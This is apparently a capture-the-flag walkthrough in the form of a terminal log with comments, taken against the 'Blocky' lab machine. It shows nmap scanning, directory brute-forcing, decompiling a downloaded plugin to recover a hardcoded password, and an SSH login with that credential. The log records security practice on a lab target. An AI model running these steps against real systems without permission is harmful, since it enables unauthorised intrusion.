allenwest1@debian:~$ ping 10.10.10.37
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=27 ttl=63 time=235 ms
64 bytes from 10.10.10.37: icmp_seq=28 ttl=63 time=261 ms
64 bytes from 10.10.10.37: icmp_seq=29 ttl=63 time=364 ms
64 bytes from 10.10.10.37: icmp_seq=30 ttl=63 time=22.6 ms
^C
--- 10.10.10.37 ping statistics ---
35 packets transmitted, 9 received, 74.2857% packet loss, time 906ms
rtt min/avg/max/mdev = 20.570/140.964/364.069/117.077 ms
allenwest1@debian:~$ nmap -sV -sC 10.10.10.37
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-28 12:11 EDT
Nmap scan report for 10.10.10.37
Host is up (0.031s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
.
.
.
// Here we see a website is open so I went there and poked around a bit.
.
.
.
allenwest1@debian:~$ cd Desktop/
allenwest1@debian:~/Desktop$ git clone https://github.com/maurosoria/dirsearch.git
allenwest1@debian:~/Desktop$ cd dirsearch/
allenwest1@debian:~/Desktop/dirsearch$ python3 dirsearch.py -w ../directory-list-2.3-medium.txt -e php -f -t 30 -u http://10.10.10.37

 _|. _ _  _  _  _ _|_    v0.3.9                     
(_||| _) (/_(_|| (_| )                              
                                                    
Extensions: php | HTTP method: get | Threads: 30 | Wordlist size: 441041                                

Error Log: /home/allenwest1/Desktop/dirsearch/logs/errors-20-04-28_12-22-49.log

Target: http://10.10.10.37                          
                                                    
[12:22:56] Starting: 
[12:22:56] 403 -  290B  - /.php
[12:22:56] 403 -  292B  - /icons/      
[12:22:57] 200 -  380B  - /wiki/          
[12:22:57] 200 -    0B  - /wp-content/  
[12:22:58] 200 -    2KB - /wp-login.php         
[12:22:59] 200 -  745B  - /plugins/       
[12:22:59] 301 -    0B  - /index.php  ->  http://10.10.10.37/
[12:23:00] 200 -   40KB - /wp-includes/     
[12:23:01] 403 -  297B  - /javascript/       
[12:23:14] 200 -  135B  - /wp-trackback.php       
[12:23:23] 302 -    0B  - /wp-admin/  ->  http://10.10.10.37/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&reauth=1
[12:23:35] 200 -   10KB - /phpmyadmin/            
[12:23:57] 405 -   42B  - /xmlrpc.php            
CTRL+C detected: Pausing threads, please wait... 
                                            
Canceled by the user

.
.
.
// As dirsearch ran I tried the directories it came up with and /plugins/ fun files to explore.
// Downloaded them
.
.
.
allenwest1@debian:~$ mv Downloads/griefprevention-1.11.2-3.1.1.298.jar ./Desktop/
allenwest1@debian:~$ mv Downloads/BlockyCore.jar ./Desktop/
allenwest1@debian:~$ cd Desktop/
allenwest1@debian:~/Desktop$ mkdir blocky
allenwest1@debian:~/Desktop$ mv BlockyCore.jar blocky/
allenwest1@debian:~/Desktop$ mv griefprevention-1.11.2-3.1.1.298.jar blocky/
allenwest1@debian:~/Desktop$ cd blocky/
allenwest1@debian:~/Desktop/blocky$ ls
BlockyCore.jar
griefprevention-1.11.2-3.1.1.298.jar
allenwest1@debian:~/Desktop$ cd blocky/
allenwest1@debian:~/Desktop/blocky$ ls
BlockyCore.jar
griefprevention-1.11.2-3.1.1.298.jar
allenwest1@debian:~/Desktop/blocky$ unzip BlockyCore.jar 
Archive:  BlockyCore.jar
  inflating: META-INF/MANIFEST.MF    
  inflating: com/myfirstplugin/BlockyCore.class  
allenwest1@debian:~/Desktop/blocky$ ls
BlockyCore.jar  com  griefprevention-1.11.2-3.1.1.298.jar  META-INF
allenwest1@debian:~/Desktop/blocky$ cd com
allenwest1@debian:~/Desktop/blocky/com$ ls
myfirstplugin
allenwest1@debian:~/Desktop/blocky/com$ cd myfirstplugin/
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ls
BlockyCore.class
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ mv ~/Downloads/jad .
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ls
BlockyCore.class  jad
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ jad BlockyCore.class 
bash: jad: command not found
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ./jad BlockyCore.class 
Parsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)
 Generating BlockyCore.jad
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ls
BlockyCore.class  BlockyCore.jad
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ nano BlockyCore.jad 
.
.
.
// Source code gave us a password that can be found in BlockyCore.jad in this github directory
// with wpscan we found a username: notch
// notch:8YsqfCTnvxAUeduzjNSXe22
.
.
.
allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ssh notch@10.10.10.37
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ 
.
.
.
// Continued in asNotch.bash
.
.
.
